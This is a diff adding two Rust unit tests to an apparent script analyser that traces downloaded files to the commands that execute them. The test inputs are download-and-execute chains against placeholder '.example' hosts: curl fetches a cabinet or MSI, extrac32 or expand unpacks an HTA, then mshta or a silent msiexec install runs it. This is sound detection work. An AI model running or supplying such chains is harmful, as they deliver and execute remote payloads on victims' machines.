@@ -10635,6 +10635,29 @@ mod extrac32_tests {
             );
         }
     }
+
+    #[test]
+    fn cabinet_extract_current_dir_nested_archive_does_not_use_unrelated_basename_download() {
+        for command in [
+            r"extrac32 /y .\Temp\payload.cab dropped.hta",
+            r"expand .\Temp\payload.cab dropped.hta",
+        ] {
+            let script = format!(
+                "curl -o D:\\Other\\payload.cab https://cab-current-dir-wrong-basename.example/payload.cab\r\n{command}\r\nmshta dropped.hta"
+            );
+            let report = crate::analyze(script.as_bytes(), &Config::default());
+            assert!(
+                !report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta dropped.hta"
+                            && url == "https://cab-current-dir-wrong-basename.example/payload.cab"
+                )),
+                "nested current-dir cabinet source reused unrelated basename after {command}: {:?}",
+                report.traits
+            );
+        }
+    }
 }
 
 #[cfg(test)]
@@ -16821,6 +16844,27 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
             )),
             "current-dir msiexec package did not resolve tracked source: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_current_dir_nested_package_does_not_use_unrelated_basename_download() {
+        let report = crate::analyze(
+            br#"curl -o D:\Other\setup.msi https://msiexec-current-dir-wrong-basename.example/setup.msi
+msiexec /i .\Temp\setup.msi /qn"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r"msiexec /i .\Temp\setup.msi /qn"
+                            && url == "https://msiexec-current-dir-wrong-basename.example/setup.msi"
+                )
+            }),
+            "msiexec nested current-dir package reused unrelated basename download: {:?}",
+            report.traits
         );
     }
 
